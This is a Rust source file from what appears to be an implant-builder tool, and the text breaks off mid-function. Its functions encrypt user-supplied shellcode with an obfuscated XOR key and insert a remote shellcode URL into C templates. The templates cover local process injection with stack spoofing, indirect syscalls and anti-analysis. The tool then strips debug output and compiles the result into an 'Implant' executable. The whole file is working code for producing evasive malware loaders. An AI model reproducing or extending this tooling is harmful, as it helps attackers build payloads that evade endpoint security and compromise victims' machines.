pub mod clib;
pub mod config;

use crate::clib::web_c;
use crate::config::structs::LogLevel;
use crate::config::structs::KEY_SIZE;
use console::style;
use rand::{thread_rng, Rng};
use std::io::prelude::*;
pub fn print_info(info: &String, level: LogLevel) {
    match level {
        LogLevel::Information => println!("{} {}", style("[*]").green(), style(info).white()),
        LogLevel::Error => println!("{} {}", style("[!]").red(), style(info).white()),
    }
}

pub fn print_hex(buffer: &[u8]) {
    for byte in buffer {
        if byte == &buffer[buffer.len() - 1] {
            print!(
                "{}{:02X}",
                style("0x").cyan().bold(),
                style(byte).cyan().bold()
            );
            break;
        } else {
            print!(
                "{}{:02X}, ",
                style("0x").cyan().bold(),
                style(byte).cyan().bold()
            );
        }
    }
    println!();
}

pub fn brute_force_decryption(
    hint_byte: u8,
    protected_key: &[u8],
    real_key: &mut [u8],
) -> Option<u8> {
    for b in 0..u8::MAX {
        if (protected_key[0] ^ b) == hint_byte {
            for i in 0..KEY_SIZE {
                real_key[i] = protected_key[i] ^ b ^ i as u8;
            }
            return Some(b);
        }
    }
    None
}

pub fn generate_random_key() -> Vec<u8> {
    let mut rng = thread_rng();
    let mut key = vec![0; KEY_SIZE];
    for i in 0..KEY_SIZE {
        key[i] = rng.gen_range(0..=u8::MAX);
    }
    key
}

pub fn generate_protected_key(hint_byte: u8, raw_key: &mut [u8]) -> Vec<u8> {
    let mut rng = thread_rng();
    let mut protected_key = vec![0; KEY_SIZE];
    let key_byte = rng.gen_range(1..=u8::MAX);

    raw_key[0] = hint_byte;
    for i in 1..KEY_SIZE {
        raw_key[i] = rng.gen_range(0..=u8::MAX);
    }

    println!(
        "{} Generated Key Byte: {}{:02X}",
        style("[*]").green().bold(),
        style("0x").cyan().bold(),
        style(key_byte).cyan().bold()
    );

    for l in 0..KEY_SIZE {
        protected_key[l] = raw_key[l] ^ l as u8 ^ key_byte;
    }

    protected_key
}
pub fn get_c_arr(arr: &mut Vec<u8>) -> String {
    let mut result = String::new();
    for byte in arr {
        result.push_str(&format!("0x{:02X}, ", byte));
    }

    result.pop();
    result.pop();
    result
}

pub fn generate_carokannspoofstackslocalinj(
    output_path: &str,
    shellcode_path: &str,
    shellcode_url: &str,
    debug: bool,
) {
    use crate::clib::carokannspoofstackslocalinj_h::CAROKANNSPOOFSTACKSLOCALINJ_CODE;
    use crate::clib::carokannspoofstackslocalinj_h::CAROKANNSPOOFSTACKSLOCALINJ_H;
    use crate::clib::carokannspoofstackslocalinj_h::CAROKANNSPOOFSTACKSLOCALINJ_INCLUDE;
    // use crate::clib::decrypt_c::DECRYPT_C;
    // use crate::clib::decrypt_h::DECRYPT_H;
    // use crate::clib::download_c::DOWNLOAD_C;
    // use crate::clib::download_h::DOWNLOAD_H;
    use crate::clib::anti_c::ANTI_C;
    use crate::clib::anti_h::ANTI_H;
    ///
    use crate::clib::carokannspoofstackslocalinj_c::CAROKANNSPOOFSTACKSLOCALINJ_C;
    use crate::clib::carokannspoofstackslocalinj_h::CAROKANNSPOOFSTACKSLOCALINJ_PAYLOAD;
    use crate::clib::cjson_c::CJSON_C;
    use crate::clib::cjson_h::CJSON_H;
    use crate::clib::globals_h::GLOBALS_H;
    use crate::clib::indirectsyscall_asm::INDIRECTSYSCALL_ASM;
    use crate::clib::indirectsyscall_c::INDIRECTSYSCALL_C;
    use crate::clib::indirectsyscall_h::INDIRECTSYSCALL_H;
    use crate::clib::main_c::MAIN_C;
    use crate::clib::makefile::MAKEFILE;
    use crate::clib::proxyhelper_asm::PROXYHELPER_ASM;
    use crate::clib::tool_c::TOOL_C;
    use crate::clib::tool_h::TOOL_H;
    ///
    use crate::clib::web_c::WEB_C;
    use crate::clib::web_h::WEB_H;

    // let decrypt_h = DECRYPT_H;
    // let decrypt_c = DECRYPT_C;
    // let download_h = DOWNLOAD_H;
    // let download_c = DOWNLOAD_C;
    let cjson_c = CJSON_C;
    let cjson_h = CJSON_H;
    let anti_c = ANTI_C;
    let anti_h = ANTI_H;
    let web_c = WEB_C;
    let web_h = WEB_H;

    let globals_h = GLOBALS_H;
    let indirectsyscall_asm = INDIRECTSYSCALL_ASM;
    let indirectsyscall_c = INDIRECTSYSCALL_C;
    let indirectsyscall_h = INDIRECTSYSCALL_H;

    let carokannspoofstackslocalinj_c = CAROKANNSPOOFSTACKSLOCALINJ_C;
    let carokannspoofstackslocalinj_h = CAROKANNSPOOFSTACKSLOCALINJ_H;
    let carokannspoofstackslocalinj_code = CAROKANNSPOOFSTACKSLOCALINJ_CODE;
    let carokannspoofstackslocalinj_include = CAROKANNSPOOFSTACKSLOCALINJ_INCLUDE;
    let carokannspoofstackslocalinj_payload = CAROKANNSPOOFSTACKSLOCALINJ_PAYLOAD;

    let proxyhelper_asm = PROXYHELPER_ASM;

    let main_c = MAIN_C;
    let makefile = MAKEFILE;
    let tool_h = TOOL_H;
    let tool_c = TOOL_C;

    // read shellcode from path
    let mut file = std::fs::File::open(shellcode_path).expect("[-] File not found");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)
        .expect("[-] Failed to read shellcode file");

    // xor the shellcode buffer with 0x08, 0x08, 0x04, 0x08
    let xor_key = [0x08, 0x08, 0x04, 0x08];
    for i in 0..buffer.len() {
        buffer[i] ^= xor_key[i % xor_key.len()];
    }

    // get random one bit
    let hint_byte = rand::thread_rng().gen_range(0..=u8::MAX);
    print!("{} Hint Byte: ", style("[*]").green().bold());
    print_hex(&[hint_byte]);

    let mut real_key: Vec<u8> = generate_random_key();
    let mut protected_key: Vec<u8> = generate_protected_key(hint_byte, &mut real_key);

    print!("{} Original Key: ", style("[*]").green().bold());
    print_hex(&real_key);
    print!("{} Protected Key: ", style("[*]").green().bold());
    print_hex(&protected_key);

    // xor encrypt the file with the real_key
    for i in 0..buffer.len() {
        buffer[i] ^= real_key[i % real_key.len()];
    }
    // get the file length
    // change protected_key into c array format string
    let protected_key_str = get_c_arr(&mut protected_key);
    // replace the key in main.c
    // create output folder
    std::fs::create_dir_all(output_path).expect("[-] Failed to create output folder");
    std::fs::create_dir_all(format!("{}/include", output_path))
        .expect("[-] Failed to create include folder");
    std::fs::create_dir_all(format!("{}/src", output_path))
        .expect("[-] Failed to create src folder");
    std::fs::create_dir_all(format!("{}/bin", output_path))
        .expect("[-] Failed to create src folder");

    // write to file

    if !debug {
        let main_c = main_c.replace("printf", "//printf");
        let main_c = main_c.replace("Print", "//Printf");
        let indirectsyscall_c = indirectsyscall_c.replace("printf", "//printf");
        let web_c = web_c.replace("printf", "//printf");
        let tool_c = tool_c.replace("printf", "//printf");
        let carokannspoofstackslocalinj_c =
            carokannspoofstackslocalinj_c.replace("printf", "//printf");
        let carokannspoofstackslocalinj_code =
            carokannspoofstackslocalinj_code.replace("printf", "//printf");

        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &carokannspoofstackslocalinj_include);

        let main_c = main_c.replace("{INJECTION}", &carokannspoofstackslocalinj_code);
        let main_c = main_c.replace(
            "//{CAROKANN_SHELLCODE_ARR}",
            &carokannspoofstackslocalinj_payload,
        );

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/CarokannSpoofstacksLocalInj.c", output_path),
            carokannspoofstackslocalinj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/CarokannSpoofstacksLocalInj.h", output_path),
            carokannspoofstackslocalinj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );

        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/ProxyHelper.asm", output_path),
            proxyhelper_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);
    } else {
        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &carokannspoofstackslocalinj_include);

        let main_c = main_c.replace("{INJECTION}", &carokannspoofstackslocalinj_code);
        let main_c = main_c.replace(
            "//{CAROKANN_SHELLCODE_ARR}",
            &carokannspoofstackslocalinj_payload,
        );

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/CarokannSpoofstacksLocalInj.c", output_path),
            carokannspoofstackslocalinj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/CarokannSpoofstacksLocalInj.h", output_path),
            carokannspoofstackslocalinj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/ProxyHelper.asm", output_path),
            proxyhelper_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);

        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
    }
    // starting build project via make
    println!(
        "{} Building Implant Project...",
        style("[*]").green().bold()
    );
    println!();
    // run make with localcommoninj arg
    let output = std::process::Command::new("make")
        .current_dir(output_path)
        .arg("CarokannSpoofstacksLocalInj")
        .output()
        .expect("Failed to build project");

    println!("{} Build command output:", style("[*]").green().bold());

    println!(
        "{}",
        style(String::from_utf8_lossy(&output.stdout)).magenta()
    );
    // println!(
    //     "{}",
    //     style(String::from_utf8_lossy(&output.stderr)).magenta()
    // );
    // println!("{}", String::from_utf8_lossy(&output.stderr));
    if !output.status.success() {
        println!(
            "{} Failed to build Implant Project",
            style("[!]").red().bold()
        );
        std::process::exit(1);
    }
    println!(
        "{} Implant Project built successfully",
        style("[+]").green().bold()
    );

    println!(
        "{} Implant saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/CarokannSpoofstacksLocalInj.exe", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Encrypted shellcode saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/shellcode.bin", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Implant Project created at: {}",
        style("[+]").green().bold(),
        style(output_path).yellow().bold()
    );
}
pub fn generate_spoofstackslocalinj(
    output_path: &str,
    shellcode_path: &str,
    shellcode_url: &str,
    debug: bool,
) {
    use crate::clib::globals_h::GLOBALS_H;
    use crate::clib::indirectsyscall_asm::INDIRECTSYSCALL_ASM;
    use crate::clib::indirectsyscall_c::INDIRECTSYSCALL_C;
    use crate::clib::indirectsyscall_h::INDIRECTSYSCALL_H;
    use crate::clib::main_c::MAIN_C;
    use crate::clib::makefile::MAKEFILE;
    use crate::clib::proxyhelper_asm::PROXYHELPER_ASM;
    use crate::clib::spoofstackslocalinj_c::SPOOFSTACKSLOCALINJ_C;
    use crate::clib::spoofstackslocalinj_h::SPOOFSTACKSLOCALINJ_CODE;
    use crate::clib::spoofstackslocalinj_h::SPOOFSTACKSLOCALINJ_H;
    use crate::clib::spoofstackslocalinj_h::SPOOFSTACKSLOCALINJ_INCLUDE;
    use crate::clib::tool_c::TOOL_C;
    use crate::clib::tool_h::TOOL_H;

    use crate::clib::anti_c::ANTI_C;
    use crate::clib::anti_h::ANTI_H;
    use crate::clib::cjson_c::CJSON_C;
    use crate::clib::cjson_h::CJSON_H;
    use crate::clib::web_c::WEB_C;
    use crate::clib::web_h::WEB_H;
    let cjson_c = CJSON_C;
    let cjson_h = CJSON_H;
    let anti_c = ANTI_C;
    let anti_h = ANTI_H;
    let web_c = WEB_C;
    let web_h = WEB_H;
    let globals_h = GLOBALS_H;
    let indirectsyscall_asm = INDIRECTSYSCALL_ASM;
    let indirectsyscall_c = INDIRECTSYSCALL_C;
    let indirectsyscall_h = INDIRECTSYSCALL_H;

    let spoofstackslocalinj_c = SPOOFSTACKSLOCALINJ_C;
    let spoofstackslocalinj_h = SPOOFSTACKSLOCALINJ_H;
    let spoofstackslocalinj_code = SPOOFSTACKSLOCALINJ_CODE;
    let spoofstackslocalinj_include = SPOOFSTACKSLOCALINJ_INCLUDE;

    let proxyhelper_asm = PROXYHELPER_ASM;

    let main_c = MAIN_C;
    let makefile = MAKEFILE;
    let tool_h = TOOL_H;
    let tool_c = TOOL_C;

    // read shellcode from path
    let mut file = std::fs::File::open(shellcode_path).expect("[-] File not found");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)
        .expect("[-] Failed to read shellcode file");

    // get random one bit
    let hint_byte = rand::thread_rng().gen_range(0..=u8::MAX);
    print!("{} Hint Byte: ", style("[*]").green().bold());
    print_hex(&[hint_byte]);

    let mut real_key: Vec<u8> = generate_random_key();
    let mut protected_key: Vec<u8> = generate_protected_key(hint_byte, &mut real_key);

    print!("{} Original Key: ", style("[*]").green().bold());
    print_hex(&real_key);
    print!("{} Protected Key: ", style("[*]").green().bold());
    print_hex(&protected_key);

    // xor encrypt the file with the real_key
    for i in 0..buffer.len() {
        buffer[i] ^= real_key[i % real_key.len()];
    }
    // change protected_key into c array format string
    let protected_key_str = get_c_arr(&mut protected_key);
    // replace the key in main.c
    // create output folder
    std::fs::create_dir_all(output_path).expect("[-] Failed to create output folder");
    std::fs::create_dir_all(format!("{}/include", output_path))
        .expect("[-] Failed to create include folder");
    std::fs::create_dir_all(format!("{}/src", output_path))
        .expect("[-] Failed to create src folder");
    std::fs::create_dir_all(format!("{}/bin", output_path))
        .expect("[-] Failed to create src folder");

    if !debug {
        let main_c = main_c.replace("printf", "//printf");
        let main_c = main_c.replace("Print", "//Printf");
        let indirectsyscall_c = indirectsyscall_c.replace("printf", "//printf");
        let tool_c = tool_c.replace("printf", "//printf");
        let spoofstackslocalinj_c = spoofstackslocalinj_c.replace("printf", "//printf");
        let spoofstackslocalinj_code = spoofstackslocalinj_code.replace("printf", "//printf");

        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &spoofstackslocalinj_include);

        let main_c = main_c.replace("{INJECTION}", &spoofstackslocalinj_code);

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        // write to file
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/SpoofstacksLocalInj.c", output_path),
            spoofstackslocalinj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/SpoofstacksLocalInj.h", output_path),
            spoofstackslocalinj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/ProxyHelper.asm", output_path),
            proxyhelper_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);
        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
    } else {
        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &spoofstackslocalinj_include);

        let main_c = main_c.replace("{INJECTION}", &spoofstackslocalinj_code);

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        // write to file
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/SpoofstacksLocalInj.c", output_path),
            spoofstackslocalinj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/SpoofstacksLocalInj.h", output_path),
            spoofstackslocalinj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/ProxyHelper.asm", output_path),
            proxyhelper_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);

        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
    }
    // starting build project via make
    println!(
        "{} Building Implant Project...",
        style("[*]").green().bold()
    );
    println!();
    // run make with localcommoninj arg
    let output = std::process::Command::new("make")
        .current_dir(output_path)
        .arg("SpoofstacksLocalInj")
        .output()
        .expect("Failed to build project");

    println!("{} Build command output:", style("[*]").green().bold());

    println!(
        "{}",
        style(String::from_utf8_lossy(&output.stdout)).magenta()
    );
    // println!(
    //     "{}",
    //     style(String::from_utf8_lossy(&output.stderr)).magenta()
    // );
    // println!("{}", String::from_utf8_lossy(&output.stderr));
    if !output.status.success() {
        println!(
            "{} Failed to build Implant Project",
            style("[!]").red().bold()
        );
        std::process::exit(1);
    }
    println!(
        "{} Implant Project built successfully",
        style("[+]").green().bold()
    );

    println!(
        "{} Implant saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/SpoofstacksLocalInj.exe", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Encrypted shellcode saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/shellcode.bin", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Implant Project created at: {}",
        style("[+]").green().bold(),
        style(output_path).yellow().bold()
    );
}
pub fn generate_localcommoninj(
    output_path: &str,
    shellcode_path: &str,
    shellcode_url: &str,
    debug: bool,
) {
    use crate::clib::globals_h::GLOBALS_H;
    use crate::clib::indirectsyscall_asm::INDIRECTSYSCALL_ASM;
    use crate::clib::indirectsyscall_c::INDIRECTSYSCALL_C;
    use crate::clib::indirectsyscall_h::INDIRECTSYSCALL_H;
    use crate::clib::localcommoninj_c::LOCALCOMMONINJ_C;
    use crate::clib::localcommoninj_h::LOCALCOMMONINJ_CODE;
    use crate::clib::localcommoninj_h::LOCALCOMMONINJ_H;
    use crate::clib::localcommoninj_h::LOCALCOMMONINJ_INCLUDE;
    use crate::clib::main_c::MAIN_C;
    use crate::clib::makefile::MAKEFILE;
    use crate::clib::tool_c::TOOL_C;
    use crate::clib::tool_h::TOOL_H;

    use crate::clib::anti_c::ANTI_C;
    use crate::clib::anti_h::ANTI_H;
    use crate::clib::cjson_c::CJSON_C;
    use crate::clib::cjson_h::CJSON_H;
    use crate::clib::web_c::WEB_C;
    use crate::clib::web_h::WEB_H;
    let cjson_c = CJSON_C;
    let cjson_h = CJSON_H;
    let anti_c = ANTI_C;
    let anti_h = ANTI_H;
    let web_c = WEB_C;
    let web_h = WEB_H;
    let globals_h = GLOBALS_H;
    let indirectsyscall_asm = INDIRECTSYSCALL_ASM;
    let indirectsyscall_c = INDIRECTSYSCALL_C;
    let indirectsyscall_h = INDIRECTSYSCALL_H;
    let localcommoninj_c = LOCALCOMMONINJ_C;
    let localcommoninj_h = LOCALCOMMONINJ_H;
    let localcommoninj_code = LOCALCOMMONINJ_CODE;
    let localcommoninj_include = LOCALCOMMONINJ_INCLUDE;
    let main_c = MAIN_C;
    let makefile = MAKEFILE;
    let tool_h = TOOL_H;
    let tool_c = TOOL_C;

    // read shellcode from path
    let mut file = std::fs::File::open(shellcode_path).expect("[-] File not found");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)
        .expect("[-] Failed to read shellcode file");

    // get random one bit
    let hint_byte = rand::thread_rng().gen_range(0..=u8::MAX);
    print!("{} Hint Byte: ", style("[*]").green().bold());
    print_hex(&[hint_byte]);

    let mut real_key: Vec<u8> = generate_random_key();
    let mut protected_key: Vec<u8> = generate_protected_key(hint_byte, &mut real_key);

    print!("{} Original Key: ", style("[*]").green().bold());
    print_hex(&real_key);
    print!("{} Protected Key: ", style("[*]").green().bold());
    print_hex(&protected_key);

    // xor encrypt the file with the real_key
    for i in 0..buffer.len() {
        buffer[i] ^= real_key[i % real_key.len()];
    }
    // change protected_key into c array format string
    let protected_key_str = get_c_arr(&mut protected_key);
    // replace the key in main.c
    // create output folder
    std::fs::create_dir_all(output_path).expect("[-] Failed to create output folder");
    std::fs::create_dir_all(format!("{}/include", output_path))
        .expect("[-] Failed to create include folder");
    std::fs::create_dir_all(format!("{}/src", output_path))
        .expect("[-] Failed to create src folder");
    std::fs::create_dir_all(format!("{}/bin", output_path))
        .expect("[-] Failed to create src folder");

    if !debug {
        let main_c = main_c.replace("printf", "//printf");
        let main_c = main_c.replace("Print", "//Printf");
        let indirectsyscall_c = indirectsyscall_c.replace("printf", "//printf");
        let tool_c = tool_c.replace("printf", "//printf");
        let localcommoninj_c = localcommoninj_c.replace("printf", "//printf");
        let localcommoninj_code = localcommoninj_code.replace("printf", "//printf");

        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &localcommoninj_include);

        let main_c = main_c.replace("{INJECTION}", &localcommoninj_code);

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        // write to file
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/LocalCommonInj.c", output_path),
            localcommoninj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/LocalCommonInj.h", output_path),
            localcommoninj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);
        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
    } else {
        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &localcommoninj_include);

        let main_c = main_c.replace("{INJECTION}", &localcommoninj_code);

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/LocalCommonInj.c", output_path),
            localcommoninj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/LocalCommonInj.h", output_path),
            localcommoninj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);

        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
    }
    // starting build project via make
    println!(
        "{} Building Implant Project...",
        style("[*]").green().bold()
    );
    println!();
    // run make with localcommoninj arg
    let output = std::process::Command::new("make")
        .current_dir(output_path)
        .arg("localcommoninj")
        .output()
        .expect("Failed to build project");

    println!("{} Build command output:", style("[*]").green().bold());

    println!(
        "{}",
        style(String::from_utf8_lossy(&output.stdout)).magenta()
    );
    // println!(
    //     "{}",
    //     style(String::from_utf8_lossy(&output.stderr)).magenta()
    // );
    // println!("{}", String::from_utf8_lossy(&output.stderr));
    if !output.status.success() {
        println!(
            "{} Failed to build Implant Project",
            style("[!]").red().bold()
        );
        std::process::exit(1);
    }
    println!(
        "{} Implant Project built successfully",
